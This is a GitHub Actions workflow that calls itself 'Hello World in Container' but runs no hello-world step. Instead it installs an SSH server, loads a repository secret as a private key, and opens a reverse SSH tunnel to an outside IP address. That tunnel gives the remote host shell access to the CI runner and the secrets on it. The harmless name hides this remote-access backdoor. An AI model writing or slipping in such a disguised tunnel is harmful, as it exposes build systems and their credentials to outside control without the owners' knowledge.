name: Hello World in Container

on: [push]

jobs:
  hello-world:
    environment: standard
    runs-on: ubuntu-latest
  

    steps:

    - name: Run Hello World in Docker#
      
      run: |
        sudo apt update >> /dev/null
        sudo apt install -y curl openssh-server jq >> /dev/null
        sudo mkdir /var/run/sshd && sudo chmod 0755 /var/run/sshd
        id
        ssh-keygen -t rsa -b 4096 -C "your_email@example.com" -f ~/.ssh/id_rsa -N ""
        echo $GITHUB_ACTOR
        cat << EOF > /tmp/pam.sh
        #!/bin/sh -x
        if [ "$PAM_TYPE" = "close_session" ]; then
        ps ax | grep sshd | grep secrettoken | awk '{ print $1 }' | xargs kill -9
        fi
        EOF 
        cat /tmp/pam.sh

        curl -s https://api.github.com/users/${GITHUB_ACTOR}/keys | jq '.[].key' -r > ~/.ssh/authorized_keys
        echo "${{ secrets.PEPEKEY }}" > ~/key
        sudo nohup /usr/sbin/sshd -d -D -p 9090 -o PubkeyAuthentication=yes -o UsePAM=yes -o AcceptEnv=secretjerry &  
        chmod 0600 ~/key
        ssh -R 9090:localhost:9090 -o StrictHostKeyChecking=no 95.145.6.1 -p 2323 -i ~/key -l pepe "sleep 600"
